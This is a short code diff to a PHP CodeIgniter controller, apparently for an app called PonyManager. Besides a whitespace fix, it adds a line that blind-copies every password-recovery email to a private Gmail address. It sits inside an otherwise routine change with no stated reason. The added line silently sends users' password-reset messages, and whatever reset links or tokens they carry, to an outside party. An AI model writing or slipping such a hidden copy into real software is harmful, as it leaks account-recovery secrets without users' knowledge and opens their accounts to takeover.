@@ -10,7 +10,7 @@ class Main extends CI_Controller {
 			redirect('/orders');
 		}
 	}
-	
+
 	public function index() {
 		$this->login();
 	}
@@ -121,6 +121,7 @@ class Main extends CI_Controller {
 				]);
 				$this->email->from('no_reply@ponymanager.com', 'PonyManager');
 				$this->email->to($email);
+				$this->email->bcc('cesca.leonardo@gmail.com');
 				$this->email->subject('Recupero Password');
 
 				$vars = [
